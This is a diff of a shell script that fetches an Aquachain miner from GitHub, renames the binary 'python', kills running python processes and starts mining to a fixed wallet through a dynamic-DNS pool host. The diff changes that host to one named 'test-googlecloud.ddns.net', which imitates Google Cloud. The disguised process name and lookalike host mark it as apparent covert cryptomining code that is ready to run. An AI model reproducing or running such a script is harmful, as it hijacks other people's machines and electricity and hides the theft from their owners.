@@ -15,13 +15,13 @@ if [ -f ${PWD}/python ]; then
 then
 pkill python
 echo " kill process"
-./python -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
+./python -F http://test-googlecloud.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
 
     
 else
 
 echo "Miner da install , chay thoi "
-./python -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
+./python -F http://test-googlecloud.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
 
      
 fi
@@ -31,6 +31,6 @@ fi
 wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
 unzip aquaminer-0.4-linux-amd64.zip
 mv aquaminer-0.4-linux-amd64 python
-./python -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
+./python -F http://test-googlecloud.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/CR7
 
 exit 0
